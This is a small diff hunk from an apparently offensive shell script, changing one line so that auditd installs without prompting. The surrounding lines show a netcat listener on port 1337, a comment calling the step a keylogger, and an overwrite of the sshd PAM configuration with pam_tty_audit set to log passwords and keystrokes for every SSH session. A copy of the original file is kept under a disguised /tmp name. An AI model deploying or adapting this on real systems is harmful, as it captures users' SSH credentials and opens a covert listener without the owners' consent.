@@ -22,7 +22,7 @@ nc -lvp 1337 &
 #Install keylogger
 cp -v /etc/pam.d/sshd /tmp/systemdtemporaryfile
 #Install auditd to make sure this works
-apt install auditd
+apt install -y auditd
 systemctl enable auditd
 echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" > /etc/pam.d/sshd
 systemctl restart sshd
